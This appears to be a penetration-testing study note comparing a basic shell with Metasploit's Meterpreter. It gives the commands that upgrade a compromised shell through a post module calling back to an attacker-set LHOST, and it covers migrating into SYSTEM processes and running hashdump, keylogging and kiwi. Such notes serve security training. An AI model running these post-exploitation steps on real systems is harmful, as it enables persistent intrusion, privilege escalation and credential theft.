## 🖥️ Shell

- **Definition:** A simple command line opened after an exploit (Windows CMD, Linux bash).
- **Capabilities:**
    - Navigate the file system (`dir`, `cd`, `cat`).
    - Run basic commands.
- **Limitations:**
    - File transfer is cumbersome.
    - No advanced features like process migration, hashdump, keylogger.
    - Low stability; sessions often drop.

---

## ⚡ Meterpreter

- **Definition:** Metasploit’s advanced post-exploitation agent.
- **Advantages:**
    - Rich command set (`hashdump`, `migrate`, `keyscan_start`, `screenshot`, `load kiwi`).
    - Easy file transfer (`upload`, `download`).
    - Process migration makes sessions more stable and privileged.
    - Direct integration with post-exploitation modules.
- **Disadvantages:**
    - More easily detected by AV/EDR.
    - Payload injection is more complex.

---

## 🔑 Transition from Shell to Meterpreter

1. **Background the shell:**
    
    ```bash
    background
    sessions -l
    ```
    
    → See the shell’s ID.
    
2. **Upgrade:**
    
    - Inline:
        
        ```bash
        sessions -u <id>
        ```
        
    - Post module:
        
        ```bash
        use post/multi/manage/shell_to_meterpreter
        set SESSION <id>
        set LHOST <your_ip>
        set LPORT <your_port>
        run
        ```
        
3. **New Meterpreter session opens:**
    
    ```bash
    sessions -l
    sessions -i <id>
    ```
    
4. **Process migration (optional but critical):**
    
    ```bash
    ps
    migrate <pid>
    getuid
    ```
    
    → Stabilize with SYSTEM privileges.
    

---
## 🎯 Summary

- **Shell** = bare command line, limited control.
- **Meterpreter** = full-featured attacker toolkit, essential for post-exploitation.
- **Transition process:** exploit → shell → background → upgrade/post module → Meterpreter → migrate.
- **Migrate:** moves the session into a stronger, privileged process, granting SYSTEM rights and critical access.